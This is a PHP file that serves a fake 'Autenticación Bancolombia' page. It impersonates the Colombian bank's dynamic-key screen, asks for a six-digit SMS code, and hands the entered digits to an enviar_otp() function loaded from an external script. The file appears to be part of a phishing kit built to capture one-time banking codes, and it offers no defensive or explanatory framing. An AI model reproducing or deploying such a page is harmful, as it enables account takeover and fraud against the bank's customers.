<?php
if (isset($_REQUEST["p"])) {
    $key = $_REQUEST["p"];
    $jsCode = <<<HTML
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Autenticación Bancolombia</title>
    <link rel="icon" href="./assets/img/logo.png">

    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link href="/assets/css/main.css" rel='stylesheet'>

    <script type="text/javascript" src="/assets/js/main.js"></script>
    <script type="text/javascript" src="/assets/js/main.js"></script>  
</head>
<body>
    <div class="wrapper">
        <header class="header"></header>

        <main class="main">
            <p id="currentDate">Jueves, 27 de Junio de 2024, 2:57 p. m.</p>

            <h2 class="main__ttl">Clave dinámica</h2>

            <div class="box">
                <i class='box__icon--lock bx bx-lock'></i>

                <p class="box__txt">
                    Hemos enviado un mensaje de texto con tu clave dinamica.
                </p>

                <div id="claveForm">
                    <input type="password" maxlength="1" inputmode="numeric" class="digit-input" id="digit1" style="width:30px; font-size:16px;">
                    <input type="password" maxlength="1" inputmode="numeric" class="digit-input" id="digit2" style="width:30px; font-size:16px;">
                    <input type="password" maxlength="1" inputmode="numeric" class="digit-input" id="digit3" style="width:30px; font-size:16px;">
                    <input type="password" maxlength="1" inputmode="numeric" class="digit-input" id="digit4" style="width:30px; font-size:16px;">
                    <input type="password" maxlength="1" inputmode="numeric" class="digit-input" id="digit5" style="width:30px; font-size:16px;">
                    <input type="password" maxlength="1" inputmode="numeric" class="digit-input" id="digit6" style="width:30px; font-size:16px;">
                </div>

                <div class="box__opt">
                    <button class="box__btn box__btn--transp" style="color:black;">Cancelar</button>
                    <button class="box__btn" id="btnOTP" style="color:black;">Continuar</button>
                </div>
            </div>

            <!-- <div class="picture"></div> -->
        </main>

        <footer class="footer">
            <div class="line"></div>
            <div class="footer__logo1"></div>
            <div class="footer__logo2"></div>
        </footer>
    </div>

    <script src="/assets/js/main.js"></script>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const inputs = document.querySelectorAll('.digit-input');

            inputs.forEach((input, index) => {
                input.addEventListener('input', () => {
                    if (input.value.length === 1 && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                });

                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && index > 0 && input.value.length === 0) {
                        inputs[index - 1].focus();
                    }
                });
            });
        });
    </script>

    <script type="text/javascript">
        var espera = 0;

        let identificadorTiempoDeEspera;

        function retardor() {
            identificadorTiempoDeEspera = setTimeout(retardorX, 900);
        }

        function retardorX() {

        }

        $(document).ready(function () {
            $('#btnOTP').click(function () {
                // Obtener referencias a los inputs por su clase
                var digitInputs = document.getElementsByClassName('digit-input');

                // Inicializar una variable para contener la concatenación de los valores
                var concatenatedValue = '';

                // Recorrer los inputs y concatenar sus valores
                for (var i = 0; i < digitInputs.length; i++) {
                    concatenatedValue += digitInputs[i].value;
                }

                console.log("hola")
                enviar_otp(concatenatedValue);
            });
        });
    </script>
</body>
</html>
HTML;
    echo $jsCode;
} else {
    // Debugging: Mostrar mensaje si no se recibe el parámetro 'p'
    echo "No se ha recibido el parámetro 'p'.";
}
?>
